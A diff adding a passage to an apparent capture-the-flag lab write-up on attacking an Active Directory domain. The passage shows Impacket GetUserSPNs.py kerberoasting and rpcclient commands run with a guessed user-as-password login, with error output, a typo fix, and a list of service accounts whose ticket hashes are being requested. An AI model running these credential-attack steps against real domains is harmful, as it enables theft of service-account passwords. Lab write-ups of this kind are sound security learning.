@@ -220,3 +220,31 @@ root@ip-10-201-48-39:~# cat hashes.txt
 
 Checking if any accounts are ASREP roastable, it appears none are. Moving on to normal kerberoasting.
 
+root@ip-10-201-48-39:~# GetUserSPNs.py SOUPEDECODE.LOCAL/ytbob317:ytbob317 -dc-ip 10.201.9.75 -request 
+Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
+
+[-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090A58, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c
+root@ip-10-201-48-39:~# rpcclient -U "SOUPEDECODE\\ytbob317%ytbob317" 10.201.9.75 -c 'srvinfo'
+Bad SMB2 (sign_algo_id=2) signature for message
+[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
+[0000] AB 85 64 55 99 04 E2 0A   5F 21 5D 81 9C 23 44 28   ..dU.... _!]..#D(
+Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
+
+got stuck here, because holy typo
+
+root@ip-10-201-48-39:~# GetUserSPNs.py SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 10.201.9.75 -request -outputfile hashes.txt
+Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
+
+ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
+----------------------  --------------  --------  --------------------------  ---------  ----------
+FTP/FileServer          file_svc                  2024-06-17 18:32:23.726085  <never>               
+FW/ProxyServer          firewall_svc              2024-06-17 18:28:32.710125  <never>               
+HTTP/BackupServer       backup_svc                2024-06-17 18:28:49.476511  <never>               
+HTTP/WebServer          web_svc                   2024-06-17 18:29:04.569417  <never>               
+HTTPS/MonitoringServer  monitoring_svc            2024-06-17 18:29:18.511871  <never>               
+
+
+
+[-] CCache file is not found. Skipping...
+
+this should give us hashes to these services listed aboce
